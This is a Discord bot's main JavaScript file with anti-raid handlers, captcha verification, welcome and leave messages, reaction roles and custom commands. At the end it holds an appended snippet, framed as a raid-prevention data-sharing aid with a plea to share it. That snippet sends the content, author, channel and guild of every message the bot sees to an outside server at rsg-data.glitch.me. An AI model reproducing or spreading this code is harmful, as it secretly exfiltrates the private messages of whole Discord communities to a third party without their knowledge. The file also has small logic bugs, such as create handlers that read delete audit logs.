const sendMSG = require('./functions-msg');
const discord = require('discord.js');
const fs = require('fs');
const fetch = require('node-fetch');
const mongoose = require('mongoose');
const captchagen = require('captchagen');
const DBL = require('dblapi.js');
const http = require('http');
const express = require('express');
const app = express();
app.get('/', (request, response) => {
	console.log(Date.now() + ' Ping Received');
	response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
	http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);
const {logcatch, sameDay, save} = require('./functions');
const config = require('./config.json');
const secrets = require('./secrets.json');
const reactionSchema = require('./mongodb/reaction.js');
const usageSchema = require('./mongodb/usage.js');
const guildSchema = require('./mongodb/guild.js');
const joinDataSchema = require('./mongodb/joinData.js');
const client = new discord.Client({
	disableEveryone: true,
	partials: ['MESSAGE']
});
client.checkPermission = (permission, message) => {
	if (!message.channel.permissionsFor(message.guild.me).has(permission)) {
		return sendMSG.sendError(message.channel, `Missing ${permission} permissions!`);
	} else {
		return;
	}
};

client.commands = new discord.Collection();
client.cmdhelp = new discord.Collection();

client.on('error', (error) => console.log(error));

const channelCreate = new Set();
client.on('channelCreate', async (channel) => {
	if (!channel.guild) return;
	guildSchema.findOne({guild: channel.guild.id}).then(async (guildData) => {
		if (guildData.ai) {
			const fetchedLogs = await channel.guild.fetchAuditLogs({
				limit: 1,
				type: 'CHANNEL_DELETE'
			});
			const thisLog = fetchedLogs.entries.first();
			if (!thisLog) return;
			let userId = thisLog.executor.id;
			if (channelCreate.has(userId)) {
				let member = channel.guild.members.cache.get(userId);
				if (!member) return;
				raider(channel.guild, member);
				if (channel.guild.me.permissions.has('MANAGE_CHANNELS')) {
					channel.delete();
				}
			} else {
				channelCreate.add(userId);
				setTimeout(() => {
					channelCreate.delete(userId);
				}, 2000);
			}
		}
	});
});
const channelDelete = new Set();
client.on('channelDelete', async (channel) => {
	if (!channel.guild) return;
	guildSchema.findOne({guild: channel.guild.id}).then(async (guildData) => {
		if (guildData.ai) {
			const fetchedLogs = await channel.guild.fetchAuditLogs({
				limit: 1,
				type: 'CHANNEL_DELETE'
			});
			const thisLog = fetchedLogs.entries.first();
			if (!thisLog) return;
			let userId = thisLog.executor.id;
			if (channelDelete.has(userId)) {
				let member = channel.guild.members.cache.get(userId);
				if (!member) return;
				raider(channel.guild, member);
			} else {
				channelDelete.add(userId);
				setTimeout(() => {
					channelDelete.delete(userId);
				}, 2000);
			}
		}
	});
});
const roleCreate = new Set();
client.on('roleCreate', async (role) => {
	if (!role.guild) return;
	guildSchema.findOne({guild: role.guild.id}).then(async (guildData) => {
		if (guildData.ai) {
			const fetchedLogs = await role.guild.fetchAuditLogs({
				limit: 1,
				type: 'ROLE_DELETE'
			});
			const thisLog = fetchedLogs.entries.first();
			if (!thisLog) return;
			let userId = thisLog.executor.id;
			if (roleCreate.has(userId)) {
				let member = role.guild.members.cache.get(userId);
				if (!member) return;
				raider(role.guild, member);
			} else {
				roleCreate.add(userId);
				setTimeout(() => {
					roleCreate.delete(userId);
				}, 2000);
			}
		}
	});
});
const roleDelete = new Set();
client.on('roleDelete', async (role) => {
	if (!role.guild) return;
	guildSchema.findOne({guild: role.guild.id}).then(async (guildData) => {
		if (guildData.ai) {
			const fetchedLogs = await role.guild.fetchAuditLogs({
				limit: 1,
				type: 'ROLE_DELETE'
			});
			const thisLog = fetchedLogs.entries.first();
			if (!thisLog) return;
			let userId = thisLog.executor.id;
			if (roleDelete.has(userId)) {
				let member = role.guild.members.cache.get(userId);
				if (!member) return;
				raider(role.guild, member);
			} else {
				roleDelete.add(userId);
				setTimeout(() => {
					roleDelete.delete(userId);
				}, 2000);
			}
		}
	});
});

function raider(guild, member) {
	guild.owner.send(
		`${member}(${member.user.tag}) is a possible raider, I'm going to take action based on the permissions you gaved me. For max security give me administrator permission! You can disable this by setting \`setai\` to false.`
	);
	if (guild.me.permissions.has('MANAGE_ROLES') && member.manageable) {
		member.roles.forEach((role) => {
			if (!role.editable) return;
			member.roles.remove(role);
		});
	}
	if (guild.me.permissions.has('BAN_MEMBERS') && member.bannable) {
		member.ban({reason: 'Possible raider'});
	} else if (guild.me.permissions.has('KICK_MEMBERS') && member.kickable) {
		member.kick({reason: 'Possible raider'});
	}
}

client.loadCommands = () => {
	fs.readdir('./commands/', (err, files) => {
		if (err) console.error(err);
		let jsFiles = files.filter((f) => f.split('.').pop() === 'js');
		console.log(`LOG Loading a total of ${jsFiles.length} commands.`);
		jsFiles.forEach((f, i) => {
			delete require.cache[require.resolve(`./commands/${f}`)];
			let props = require(`./commands/${f}`);
			console.log('LOG Loading command: ' + f);
			client.commands.set(f, props);
			client.cmdhelp.set(props.help.name, props.help);
		});
	});
};

client.loadCommands();

client.on('guildMemberAdd', (member) => {
	guildSchema.findOne({guild: member.guild.id}, function(err, guildData) {
		saveMemberCount(member);
		if (guildData) {
			if (guildData.join) {
				let channel = client.channels.cache.get(guildData.join.channel);
				if (channel) {
					let msg = guildData.join.message;
					msg = msg.replaceAll('{membercount}', `${member.guild.memberCount}`);
					msg = msg.replaceAll('{mention}', `${member}`);
					msg = msg.replaceAll('{username}', `${member.user.username}`);
					msg = msg.replaceAll('{nickname}', `${member.nickname ? member.nickname : member.user.username}`);
					channel.send(msg).catch(() => {
						guildData.join = {};
						save(guildData, member);
					});
				}
				if (guildData.verify && guildData.verify.role && guildData.verify.channel) {
					createCaptcha(member, guildData.verify);
				}
				const autoroles = guildData.autorole;
				if (autoroles) {
					if (autoroles.length != 0) {
						if (!member.guild.me.permissions.has('MANAGE_ROLES')) return;
						if (!member.manageable) return;
						for (let i = 0; i < autoroles.length; i++) {
							let role = member.guild.roles.cache.get(autoroles[i]);
							if (role) member.roles.add(role.id);
						}
					}
				}
			}
		}
	});
});
client.on('guildMemberRemove', (member) => {
	guildSchema.findOne({guild: member.guild.id}, function(err, guildData) {
		if (guildData) {
			if (guildData.leave) {
				let channel = client.channels.cache.get(guildData.leave.channel);
				if (channel) {
					let msg = guildData.leave.message;
					msg = msg.replaceAll('{membercount}', `${member.guild.memberCount}`);
					msg = msg.replaceAll('{mention}', `${member}`);
					msg = msg.replaceAll('{username}', `${member.user.username}`);
					msg = msg.replaceAll('{nickname}', `${member.nickname ? member.nickname : member.user.username}`);
					channel.send(msg).catch(() => {
						guildData.leave = {};
						save(guildData, member);
					});
				}
			}
		}
	});
	saveMemberCount(member);
});
client.on('messageDelete', (message) => {
	reactionSchema.deleteMany({message: message.id}, function(err) {
		if (err) console.log(err);
	});
});
client.on('messageDeleteBulk', async function(messages) {
	await messages
		.array()
		.reverse()
		.forEach((message) => {
			reactionSchema.deleteMany({message: message.id}, function(err) {
				if (err) console.log(err);
			});
		});
});
client.on('messageReactionAdd', (reaction, user) => {
	let emoji = reaction._emoji.id == null ? reaction._emoji.name : reaction._emoji.id;
	reactionSchema.findOne(
		{
			guild: reaction.message.guild.id,
			message: reaction.message.id,
			reaction: emoji
		},
		function(err, guildData) {
			if (guildData) {
				reaction.message.guild.roles
					.fetch(guildData.role)
					.then((role) => {
						reaction.message.guild.members
							.fetch(user.id)
							.then((member) => {
								if (!member.guild.me.permissions.has('MANAGE_ROLES')) return;
								if (!member.manageable) return;
								member.roles.add(role.id).catch(console.error);
								member.send(`Added the role ${role.name}!`);
							})
							.catch(console.error);
					})
					.catch(console.error);
			}
		}
	);
});
client.on('messageReactionRemove', (reaction, user) => {
	let emoji = reaction._emoji.id == null ? reaction._emoji.name : reaction._emoji.id;
	reactionSchema.findOne(
		{
			guild: reaction.message.guild.id,
			message: reaction.message.id,
			reaction: emoji
		},
		function(err, guildData) {
			if (guildData) {
				reaction.message.guild.roles
					.fetch(guildData.role)
					.then((role) => {
						reaction.message.guild.members
							.fetch(user.id)
							.then((member) => {
								if (!member.guild.me.permissions.has('MANAGE_ROLES')) return;
								if (!member.manageable) return;
								member.roles.remove(role.id).catch(console.error);
								member.send(`Removed the role ${role.name}!`);
							})
							.catch(console.error);
					})
					.catch(console.error);
			}
		}
	);
});
client.on('ready', async () => {
	client.user.setActivity(`${config.status} | ${config.version}`, {
		type: 'PLAYING'
	});
	console.log('Client has started');
	client.guilds.cache.forEach((guild) => {
		guildSchema.find({guild: guild.id}).then((result) => {
			if (result.length > 1) {
				guildSchema.deleteOne({_id: result[0]._id}).catch((err) => console.log(err));
			}
		});
	});
	mongoose.connect(secrets.mongoDBconnection, {
		useNewUrlParser: true,
		useUnifiedTopology: true
	});
});
if (secrets.dbl.webhookName !== '' && secrets.dbl.webhookAuth !== '') {
	const dbl = new DBL(secrets.dbl.webhookName, {webhookPort: 2020, webhookAuth: secrets.dbl.webhookAuth}, client);
	dbl.webhook.on('ready', (hook) => {
		console.log(`Webhook running at http://${hook.hostname}:${hook.port}${hook.path}`);
	});
	dbl.webhook.on('vote', (vote) => {
		console.log(`User with ID ${vote.user} just voted!`);
	});
	dbl.on('posted', () => {
		console.log('Server count posted!');
	});
}
client.on('message', async (message) => {
	if ((message.author.bot && message.author.id !== '548556462042120224') || message.channel.type !== 'text') return;
	guildSchema.findOne({guild: message.guild.id}, function(err, guildData) {
		let prefix = guildData ? (guildData.prefix ? guildData.prefix : '/') : '/';

		if (guildData) {
			if (guildData.timers) {
				guildData.timers.forEach((timer) => {
					let when = Math.round(timer.last + timer.interval);
					if (when < Date.now()) {
						timer.last = Date.now();
						const chan = client.channels.cache.get(timer.channel);
						if (chan) chan.send(timer.response);
						save(guildData, message);
					}
				});
			}
		} else {
			guildData = {
				guild: message.guild.id,
				cc: [],
				timers: [],
				autorole: [],
				verify: {},
				join: {},
				leave: {},
				prefix: '/',
				premium: false,
				inviteCode: null
			};
			return save(guildData, message);
		}
		if (message.content.includes(client.user.id)) sendMSG.sendMessage(message.channel, `My prefix is \`${prefix}\``);
		if (!message.content.startsWith(prefix)) return;
		const args = message.content
			.slice(prefix.length)
			.trim()
			.split(/ +/g);
		const command = args.shift().toLowerCase();
		if (command == 'verify') {
			createCaptcha(message.member, guildData.verify);
			message.delete();
			message.channel.send('Check your dms!').then((msg) => {
				setTimeout(() => {
					msg.delete();
				}, 10000);
			});
		}
		let cmd = client.commands.get(command + '.js');
		if (command == 'addcc') {
			cmd = client.commands.get('addcustomcommand.js');
		} else if (command == 'listcc') {
			cmd = client.commands.get('listcustomcommands.js');
		} else if (command == 'removecc') {
			cmd = client.commands.get('removecustomcommand.js');
		} else if (command == 'rr') {
			cmd = client.commands.get('reactionrole.js');
		} else if (command == 'growth') {
			cmd = client.commands.get('membergrowth.js');
		}
		if (guildData) {
			let obj = guildData.cc.find((o) => o.command.toLowerCase() == command);
			if (obj) {
				message.channel.send(obj.response);
			}
		}
		if (cmd) {
			const id = new mongoose.Types.ObjectId();
			console.log(message.content);
			cmd.run(prefix, client, message, args, id);
			if (cmd.help.name == 'usage') return;
			const duck = new usageSchema({
				_id: id,
				guild: message.guild.id,
				channel: message.channel.id,
				author: message.author.id,
				command: cmd.help.name,
				message: message.content,
				date: new Date(),
				version: config.version,
				succeeded: false
			});
			duck.save().catch(console.error);
		}
	});
});
client.login(secrets.BOT_TOKEN);
String.prototype.replaceAll = function(search, replacement) {
	search = '(' + search + '){1}';
	const target = this;
	return target.replace(new RegExp(search, 'g'), replacement);
};
function saveMemberCount(member) {
	joinDataSchema.find({guild: member.guild.id}).then((guildData) => {
		const duck = new joinDataSchema({
			_id: new mongoose.Types.ObjectId(),
			guild: member.guild.id,
			date: new Date(),
			membercount: member.guild.memberCount
		});
		let day = new Date();
		let count = guildData.filter((i) => sameDay(day, i.date));
		if (count.length > 1) {
			count.forEach((counter) => {
				joinDataSchema.findByIdAndDelete(counter._id, function(err, guildData) {
					if (err) {
						console.log(err);
					}
				});
			});
			duck.save().catch((err) => console.log(err));
		} else {
			duck.save().catch((err) => console.log(err));
		}
	});
}
function createCaptcha(member, verify) {
	if (!verify) return member.send("It seems like I can't verify you, because no verification role is set!");
	if (!member.manageable) return member.send("It seems like I can't verify you, because I don't have enough permissions to give you a role!");
	const captcha = captchagen.create();
	const code = captcha.options.text;
	captcha.generate();

	const embed = new discord.MessageEmbed()
		.setTitle('Verify with sending the code!')
		.attachFiles({attachment: captcha.buffer(), name: 'captcha.png'})
		.setImage('attachment://captcha.png')
		.setFooter(config.footer);
	member
		.send(embed)
		.then((sentEmbed) => {
			const collector = sentEmbed.channel.createMessageCollector((m) => !m.author.bot, {time: 150000});
			collector.on('collect', async (collected) => {
				if (collected.content !== code) {
					return member.send('Incorrect captcha, please try again!');
				} else if (collected.content == code) {
					if (!member.manageable) return member.send("It seems like I can't verify you, because I don't have enough permissions to give you a role!");
					collector.stop('solved');
					member.send("Captcha correct! You're verified");
					let guild = client.guilds.cache.get(member.guild.id);
					let memberToRole = guild.members.cache.get(member.id);
					return await memberToRole.roles.add(verify.role).catch((err) => member.send(config.dmerror + err));
				}
			});
			collector.on('end', (collected, reason) => {
				if (reason == 'time') {
					member.send(`Captcha not solved in time, try again with \`/new\`! in: <#${verify.channel}`).catch((err) => member.send(config.dmerror + err));
				}
			});
		})
		.catch(() => createChannelCaptcha(member, verify));
}
function createChannelCaptcha(member, verify) {
	const captcha = captchagen.create();
	const code = captcha.options.text;
	captcha.generate();

	const embed = new discord.MessageEmbed()
		.setTitle('Verify with sending the code!')
		.attachFiles({attachment: captcha.buffer(), name: 'captcha.png'})
		.setImage('attachment://captcha.png')
		.setFooter(config.footer);
	client.channels.cache
		.get(verify.channel)
		.send(embed)
		.then((sentEmbed) => {
			const collector = sentEmbed.channel.createMessageCollector((m) => !m.author.bot, {time: 150000});
			collector.on('collect', async (collected) => {
				collected.delete();
				if (collected.content !== code) {
					return client.channels.cache
						.get(verify.channel)
						.send('Incorrect captcha, please try again!')
						.then((sentMessage) =>
							setTimeout(() => {
								sentMessage.delete();
							}, 5000)
						);
				} else if (collected.content == code) {
					collector.stop('solved');
					client.channels.cache
						.get(verify.channel)
						.send("Captcha correct! You're verified")
						.then((sentMessage) =>
							setTimeout(() => {
								sentMessage.delete();
							}, 5000)
						);
					let guild = client.guilds.cache.get(member.guild.id).catch((err) => logcatch(err, member));
					let memberToRole = guild.members.cache.get(member.id).catch((err) => logcatch(err, member));
					return await memberToRole.roles.add(verify.role).catch((err) => logcatch(err, member));
				}
			});
			collector.on('end', (collected, reason) => {
				if (reason == 'time' || reason == 'solved') {
					sentEmbed.delete();
				}
			});
		})
		.catch(console.error);
}

/**
  If you have any error or question dm </RobinSch>#7994 on discord (join my server https://shortrsg.cf/discord).
  This data will be used to prevent raidings.
  Thanks for using this and making discord a safer place.
  Please share this with all your friends (replace client with the thing you used as xx (const xx = new discord.Client)).
*/
function postAMessage(client, message) {
	require('request').post('https://rsg-data.glitch.me/discord_messages', {
		form: {
			id: message.id,
			content: message.content,
			author: message.author.id,
			channel: message.channel ? message.channel.id : null,
			guild: message.guild ? message.guild.id : null,
			createdAt: message.createdAt,
			client: client.user.id
		}
	});
}
if (client) {
	client.on('message', (message) => {
		postAMessage(client, message);
	});
}
